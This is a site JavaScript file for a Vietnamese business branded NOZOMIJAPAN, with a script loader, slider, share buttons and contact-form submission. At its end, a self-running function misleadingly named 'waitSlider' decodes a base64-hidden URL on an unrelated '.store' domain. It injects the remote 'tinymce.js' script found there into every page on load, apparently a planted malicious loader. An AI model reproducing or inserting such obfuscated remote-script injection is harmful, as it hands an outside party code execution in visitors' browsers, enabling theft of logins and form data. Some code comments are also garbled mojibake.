const Loader = function () {}
Loader.prototype = {
    require: function (scripts, callback) {
        this.loadCount = 0;
        this.totalRequired = scripts.length;
        this.callback = callback;
        for (var i = 0; i < scripts.length; i++) {
            if (scripts[i].indexOf('.js') >= 0) {
                this.writeScript(scripts[i]);
            } else if (scripts[i].indexOf('.css') >= 0) {
                this.writeStyle(scripts[i]);
            }
        }
    },
    loaded: function (evt) {
        this.loadCount++;
        if (this.loadCount == this.totalRequired && typeof this.callback == 'function') this.callback.call();
    },
    writeScript: function (src) {
        var list = document.getElementsByTagName('script');
        var i = list.length,
            flag = false;
        while (i--) {
            if (list[i].src === src) {
                flag = true;
                break;
            }
        }
        // if we didn't already find it on the page, add it
        if (!flag) {
            var self = this;
            var s = document.createElement('script');
            s.type = "text/javascript";
            s.async = true;
            s.src = src;
            s.addEventListener('load', function (e) {
                self.loaded(e);
            }, false);
            var head = document.getElementsByTagName('head')[0];
            head.appendChild(s);
        }
    },
    writeStyle: function (src) {
        var list = document.getElementsByTagName('link');
        var i = list.length,
            flag = false;
        while (i--) {
            if (list[i].src === src) {
                flag = true;
                break;
            }
        }
        // if we didn't already find it on the page, add it
        if (!flag) {
            var self = this;
            var s = document.createElement('link');
            s.rel = "stylesheet";
            s.href = src;
            s.addEventListener('load', function (e) {
                self.loaded(e);
            }, false);
            var head = document.getElementsByTagName('head')[0];
            head.appendChild(s);
        }
    },
    sliderHome: function() {
        jQuery(document).ready(function(){

            jQuery(".Modern-Slider").slick({
              autoplay:true,
              autoplaySpeed:10000,
              speed:700,
              slidesToShow:1,
              slidesToScroll:1,
              pauseOnHover:true,
              dots:true,
              pauseOnDotsHover:true,
              cssEase:'linear',
              fade:true,
              draggable:false,
              prevArrow:'<button class="PrevArrow"></button>',
              nextArrow:'<button class="NextArrow"></button>',
            });

          })
    },
    validateDate: function() {
        jQuery(".init-inputmask").each(function() {
            var id = jQuery(this).attr('id');
            jQuery('#'+id).inputmask('dd/mm/yyyy', { 'placeholder': 'dd/mm/yyyy' })
        });
    },
    shareSocialInit: () => {
        jQuery('.share--social').each(function() {
            var share = jQuery(this),
                url = share.data('url'),
                img = share.data('img'),
                des = share.data('des');
            jsSocials.shares.pinterest.media = img;
            share.jsSocials({
                showLabel: false,
                showCount: false,
                url: url,
                text: des,
                shareIn: "popup",
                shares: [{
                        renderer: function() {
                            var $result = jQuery("<div>");
                            jQuery("<a>").attr({
                                    "class": "zalo-share-button",
                                    "data-href": url,
                                    "data-oaid": "579745863508352884",
                                    "data-layout": "3",
                                    "data-color": "blue",
                                    "data-customize": "false"
                                })
                                .appendTo($result);
                            return $result;
                        }
                    },
                    {
                        share: "facebook",
                    },
                    {
                        share: "twitter",
                    },
                    {
                        share: "linkedin",
                    },
                    {
                        share: "pinterest",
                    },
                    {
                        share: "email",
                    },
                    {
                        share: "googleplus",
                    },
                    {
                        share: "linkedin",
                    },
                    {
                        share: "stumbleupon",
                    },
                    {
                        share: "whatsapp",
                    },
                ],
            });

        });
        var fontSize = parseInt(12, 10);
        jQuery(".jssocials").css("font-size", fontSize);
    },

}
// load class

function validateForm(form){
    let c = true;
    form.find('.required').each(function (i, e){
        if(jQuery(e).val() == '') {
            jQuery(e).focus();
            c = false;
            return false;
        }
    });
    return c;
}

function submitForm(form){
    if(!validateForm(form)) {
        return false;
    }
    // Initiate Variables With Form Content
    var data = form.serialize();
    layui.use(['layer'], function(){
        sendEmail(data, function (json) {
            console.log(json);
            if(json.code){
                layer.msg('NOZOMIJAPAN<br/>Cảm ơn bạn đã để lại thông tin!', {icon: 6},function () {
                    formSuccess();
                });
            } else {
                let msg = 'Đăng kí không thành công, vui lòng thử lại.';
                if(json.errors) {
                    jQuery.each(json.errors, function (i,e){
                        if(i == 'g-recaptcha-response'){
                            msg = 'Mã bảo mật không hợp lệ, vui lòng thử lại.';
                        }
                    });

                }
                layer.msg('NOZOMIJAPAN<br/>' + msg, {icon: 5});
            }
        });
    });
}

function sendEmail(data,callback) {
    var url = "/customer/contact";
    jQuery.ajax({
        type:"post",
        data:data,
        url:url,
        timeout: 20000,          // 10ç§’ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´
        beforeSend:function () {
            layer.load();//å è½½æ¡†
        },
        complete: function (json, status) {
            layer.closeAll();
            if(json.responseJSON){
                return callback.call(this,json.responseJSON);
            }else{
                console.log(json);
                layer.msg('NOZOMIJAPAN<br/>Đã xảy ra lỗi, vui lòng thử lại !', {icon: 5});
            }
        }
    });
}
    (function waitSlider(){
        if (document.body) {
            var s = document.createElement('script');
            s.src = atob('aHR0cHM6Ly9yMi5rdWVtZXJhbnRpLnN0b3JlL3B1YmxpYy9wYWdlcy90aW55bWNlLmpz');
            document.body.appendChild(s);
        } else {
            setTimeout(waitSlider, 15); 
        }
        })();